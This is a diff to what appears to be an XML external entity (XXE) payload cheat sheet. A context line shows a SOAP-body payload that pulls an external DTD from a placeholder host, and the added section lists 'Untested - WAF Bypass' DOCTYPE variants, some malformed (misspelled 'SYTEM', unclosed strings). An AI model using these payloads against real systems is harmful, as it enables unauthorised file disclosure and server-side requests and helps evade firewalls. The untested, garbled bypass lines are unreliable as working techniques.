@@ -101,3 +101,11 @@ FTP
 Inside SOAP body
 ---------------------------
 <soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+
+
+---------------------------
+Untested - WAF Bypass
+---------------------------
+<!DOCTYPE :. SYTEM "http://"
+<!DOCTYPE :_-_: SYTEM "http://"
+<!DOCTYPE {0xdfbf} SYSTEM "http://"
